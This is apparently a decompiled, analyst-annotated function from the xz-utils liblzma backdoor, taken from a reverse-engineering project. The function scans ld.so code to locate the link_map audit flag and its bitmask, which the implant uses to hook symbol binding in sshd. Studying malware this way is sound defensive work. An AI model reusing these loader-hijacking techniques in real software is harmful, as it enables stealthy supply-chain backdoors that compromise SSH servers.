// /home/kali/xzre-ghidra/xzregh/104AE0_find_link_map_l_audit_any_plt_bitmask.c
// Function: find_link_map_l_audit_any_plt_bitmask @ 0x104AE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_audit_any_plt_bitmask(backdoor_data_handle_t * data, instruction_search_ctx_t * search_ctx)


/*
 * AutoDoc: Takes the displacement from `find_link_map_l_name` and hunts for the byte and mask that back ld.so’s `link_map::l_audit_any_plt`
 * flag. It temporarily resolves `EVP_DecryptInit_ex` and libc’s `getuid`, decodes `_dl_audit_symbind_alt` with `x86_dasm`, and
 * tracks which register holds the computed pointer. Once it sees the MOV-from-link_map followed by a TEST/BT it validates that the
 * mask is a single set bit, records the absolute address in `hooks->ldso_ctx.sshd_link_map_l_audit_any_plt_addr`, stores the byte-
 * wide mask, and insists the bit is still clear; otherwise the helper sets the search context’s `result` flag and bails out.
 */

#include "xzre_types.h"

BOOL find_link_map_l_audit_any_plt_bitmask
               (backdoor_data_handle_t *data,instruction_search_ctx_t *search_ctx)

{
  imported_funcs_t *imports;
  libc_imports_t *libc_imports;
  u32 *matched_register;
  backdoor_hooks_data_t *hook_table;
  uchar mask_register;
  BOOL success;
  u32 mask_bits;
  lzma_allocator *allocator;
  pfn_EVP_DecryptInit_ex_t evp_decryptinit_stub;
  lzma_allocator *libc_allocator;
  pfn_getuid_t getuid_stub;
  link_map *audit_flag_slot;
  uchar lea_ptr_register;
  byte bVar12;
  long lVar13;
  u8 *puVar14;
  dasm_ctx_t *pdVar15;
  int iVar16;
  u8 *audit_sym_cursor;
  byte bVar17;
  dasm_ctx_t local_80;
  
  bVar17 = 0;
  success = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x97,0x1f,9);
  if (success != FALSE) {
    audit_sym_cursor = search_ctx->start_addr;
    pdVar15 = &local_80;
    for (lVar13 = 0x16; lVar13 != 0; lVar13 = lVar13 + -1) {
      *(undefined4 *)&pdVar15->instruction = 0;
      pdVar15 = (dasm_ctx_t *)((long)pdVar15 + (ulong)bVar17 * -8 + 4);
    }
    allocator = get_lzma_allocator();
    allocator->opaque = data->elf_handles->libcrypto;
    evp_decryptinit_stub = (pfn_EVP_DecryptInit_ex_t)lzma_alloc(0xc08,allocator);
    imports = search_ctx->imported_funcs;
    imports->EVP_DecryptInit_ex = evp_decryptinit_stub;
    if (evp_decryptinit_stub != (pfn_EVP_DecryptInit_ex_t)0x0) {
      imports->resolved_imports_count = imports->resolved_imports_count + 1;
    }
    libc_imports = imports->libc;
    libc_allocator = get_lzma_allocator();
    libc_allocator->opaque = data->elf_handles->libc;
    getuid_stub = (pfn_getuid_t)lzma_alloc(0x348,libc_allocator);
    libc_imports->getuid = getuid_stub;
    if (getuid_stub != (pfn_getuid_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    iVar16 = 0;
    bVar17 = 0xff;
    for (; audit_sym_cursor < search_ctx->end_addr; audit_sym_cursor = audit_sym_cursor + local_80.instruction_size) {
      success = x86_dasm(&local_80,audit_sym_cursor,search_ctx->end_addr);
      if (success == FALSE) {
        return FALSE;
      }
      if (iVar16 == 0) {
        if (((local_80._40_4_ == 0x1036) && (((ushort)local_80.prefix._0_4_ & 0x140) == 0x140)) &&
           ((byte)(local_80.prefix._13_1_ - 1) < 2)) {
          lea_ptr_register = 0;
          if ((local_80.prefix._0_4_ & 0x40) == 0) {
            mask_register = 0;
            if (((local_80.prefix._0_4_ & 0x1040) != 0) &&
               (mask_register = local_80.prefix.decoded.flags2 & 0x10, (local_80.prefix._0_4_ & 0x1000) != 0
               )) {
              if ((local_80.prefix._0_4_ & 0x20) == 0) {
                lea_ptr_register = 0;
                mask_register = local_80.imm64_reg;
              }
              else {
                mask_register = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
              }
            }
          }
          else {
            mask_register = local_80.prefix.decoded.flags & 0x20;
            if ((local_80.prefix._0_4_ & 0x20) == 0) {
              lea_ptr_register = local_80.prefix._15_1_;
              if ((local_80.prefix._0_4_ & 0x1040) != 0) {
                mask_register = local_80.prefix._14_1_;
              }
            }
            else {
              lea_ptr_register = local_80.prefix._15_1_ | (char)local_80.prefix.decoded.rex * '\b' & 8U;
              mask_register = 0;
              if ((local_80.prefix._0_4_ & 0x1040) != 0) {
                mask_register = local_80.prefix._14_1_ | (char)local_80.prefix.decoded.rex * '\x02' & 8U;
              }
            }
          }
          puVar14 = (u8 *)0x0;
          if (((local_80.prefix._0_4_ & 0x100) != 0) &&
             (puVar14 = (u8 *)local_80.mem_disp,
             ((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000)) {
            puVar14 = local_80.instruction + (long)(local_80.mem_disp + local_80.instruction_size);
          }
          if (((u8 *)(ulong)*(uint *)&search_ctx->offset_to_match == puVar14) &&
             (((int)(uint)*(ushort *)search_ctx->output_register >> (lea_ptr_register & 0x1f) & 1U) != 0)) {
            *(undefined1 *)((long)search_ctx->output_register + 2) = mask_register;
            iVar16 = 1;
          }
        }
      }
      else if (iVar16 == 1) {
        if ((local_80._40_4_ & 0xfffffffd) == 0x89) {
          matched_register = search_ctx->output_register_to_match;
          lea_ptr_register = local_80.prefix.decoded.flags & 0x40;
          if ((local_80.prefix._0_4_ & 0x1040) == 0) {
            mask_register = 0;
            if ((local_80.prefix._0_4_ & 0x40) != 0) goto LAB_00104d83;
            if (*(char *)((long)matched_register + 2) != '\0') goto LAB_00104e97;
            bVar12 = 0;
LAB_00104da0:
            if (search_ctx->output_register[2] != lea_ptr_register) goto LAB_00104da9;
          }
          else {
            if ((local_80.prefix._0_4_ & 0x40) == 0) {
              if ((local_80.prefix._0_4_ & 0x1000) == 0) {
                if (*(char *)((long)matched_register + 2) == '\0') {
                  mask_register = 0;
                  bVar12 = 0;
                  goto LAB_00104da0;
                }
                goto LAB_00104e97;
              }
              mask_register = local_80.imm64_reg;
              if ((local_80.prefix._0_4_ & 0x20) != 0) {
                mask_register = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
              }
            }
            else {
              mask_register = local_80.prefix._14_1_;
              if ((local_80.prefix._0_4_ & 0x20) != 0) {
                mask_register = local_80.prefix._14_1_ | (char)local_80.prefix.decoded.rex * '\x02' & 8U;
              }
LAB_00104d83:
              lea_ptr_register = local_80.prefix._15_1_;
              if ((local_80.prefix._0_4_ & 0x20) != 0) {
                lea_ptr_register = local_80.prefix._15_1_ | ((byte)local_80.prefix.decoded.rex & 1) << 3;
              }
            }
            bVar12 = *(byte *)((long)matched_register + 2);
            if (bVar12 == mask_register) goto LAB_00104da0;
LAB_00104da9:
            if ((lea_ptr_register != bVar12) || (search_ctx->output_register[2] != mask_register)) goto LAB_00104e97;
          }
          iVar16 = 2;
          bVar17 = lea_ptr_register;
          if (local_80._40_4_ != 0x89) {
            bVar17 = mask_register;
          }
        }
      }
      else if (iVar16 == 2) {
        if (local_80._40_4_ == 0x128) {
          bVar12 = 0;
        }
        else {
          if ((local_80._40_4_ != 0x176) || (local_80.prefix._14_1_ != 0)) goto LAB_00104e97;
          bVar12 = 0;
          if ((local_80.prefix._0_4_ & 0x1040) != 0) {
            if ((local_80.prefix._0_4_ & 0x40) == 0) {
              bVar12 = local_80.prefix.decoded.flags2 & 0x10;
              if (((local_80.prefix._0_4_ & 0x1000) != 0) &&
                 (bVar12 = local_80.imm64_reg, (local_80.prefix._0_4_ & 0x20) != 0)) {
                bVar12 = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
              }
            }
            else {
              bVar12 = local_80.prefix.decoded.flags & 0x20;
              if ((local_80.prefix._0_4_ & 0x20) != 0) {
                bVar12 = (char)local_80.prefix.decoded.rex * '\x02' & 8;
              }
            }
          }
        }
        if (bVar17 == bVar12) {
          if ((local_80.operand_zeroextended < 0x100) &&
             (mask_bits = count_bits(local_80.operand_zeroextended), mask_bits == 1)) {
            hook_table = search_ctx->hooks;
            audit_flag_slot = data->data->main_map + *(uint *)&search_ctx->offset_to_match;
            (hook_table->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = audit_flag_slot;
            (hook_table->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)local_80.operand_zeroextended;
            if ((audit_flag_slot->_opaque & local_80.operand_zeroextended) == 0) {
              return TRUE;
            }
          }
          search_ctx->result = TRUE;
          return FALSE;
        }
      }
LAB_00104e97:
    }
    allocator->opaque = data->elf_handles->libcrypto;
    lzma_free(search_ctx->imported_funcs->EVP_DecryptInit_ex,allocator);
    lzma_free(libc_imports->getuid,libc_allocator);
  }
  return FALSE;
}

